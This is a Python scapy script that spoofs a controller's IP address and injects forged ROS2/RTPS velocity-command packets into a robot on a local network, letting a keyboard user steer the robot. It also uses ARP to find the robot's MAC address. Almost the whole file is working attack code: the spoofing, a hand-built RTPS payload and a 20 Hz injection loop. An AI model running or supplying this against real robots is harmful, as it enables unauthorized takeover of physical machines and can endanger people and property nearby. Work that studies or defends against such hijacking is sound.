from scapy.all import *
import threading
import time
import struct
import sys
import select
import tty
import termios

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.16" # We spoof as this IP
interface     = "wlan0"

# Shared control variables
target_linear  = 0.0
target_angular = 0.0

# --- SSH KEYBOARD ENGINE ---
def get_key():
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.read(1)
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

def keyboard_control_thread():
    global target_linear, target_angular
    speed = 1.5
    turn = 2.0
    print("[*] AUTONOMOUS CONTROL ACTIVE: W/S (Fwd/Back), A/D (Rotate), SPACE (Stop)")
    while True:
        key = get_key()
        if key:
            k = key.lower()
            if k == 'w': target_linear = speed; target_angular = 0.0
            elif k == 's': target_linear = -speed; target_angular = 0.0
            elif k == 'a': target_linear = 0.0; target_angular = turn
            elif k == 'd': target_linear = 0.0; target_angular = -turn
            elif k == ' ': target_linear = 0.0; target_angular = 0.0
        time.sleep(0.02)

# --- THE PACKET GENERATOR ---
def packet_generator_thread(robot_mac):
    global target_linear, target_angular
    print(f"[*] Starting Packet Injection to {robot_ip}...")
    
    # This is a template of a ROS2/RTPS Twist Packet
    # We use the '15 05' marker and '00 00 01 00' CDR header we found earlier
    base_payload = (
        b'\x52\x54\x50\x53\x02\x01\x01\x0a\x00\x00\x00\x00\x00\x00\x00\x00' # RTPS Header
        b'\x00\x00\x00\x00\x15\x05\x00\x00' # Data Submessage Marker (15 05)
        b'\x00\x00\x00\x00\x00\x00\x01\x00' # CDR Encapsulation Header
    )
    
    # Padding to get to our +8 offset
    padding = b'\x00' * 4 

    while True:
        # Build the 6 doubles (Linear X, Y, Z, Angular X, Y, Z)
        # We only care about Linear X and Angular Z
        data = (
            struct.pack('<d', float(target_linear)) +  # Linear X
            struct.pack('<d', 0.0) +                   # Linear Y
            struct.pack('<d', 0.0) +                   # Linear Z
            struct.pack('<d', 0.0) +                   # Angular X
            struct.pack('<d', 0.0) +                   # Angular Y
            struct.pack('<d', float(target_angular))   # Angular Z
        )
        
        full_payload = base_payload + padding + data
        
        # Build the UDP Packet
        pkt = IP(src=controller_ip, dst=robot_ip) / UDP(sport=35777, dport=7413) / Raw(load=full_payload)
        
        # Send via Layer 2 to ensure it hits the Robot's MAC
        send(pkt, verbose=False, iface=interface)
        
        time.sleep(0.05) # Send at 20Hz

# --- MAC DISCOVERY ---
def get_mac(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans: return ans[0][1].hwsrc
    return None

if __name__ == "__main__":
    r_mac = get_mac(robot_ip)
    if r_mac:
        threading.Thread(target=keyboard_control_thread, daemon=True).start()
        packet_generator_thread(r_mac)
    else:
        print("[!] Could not find Robot MAC. Is it awake?")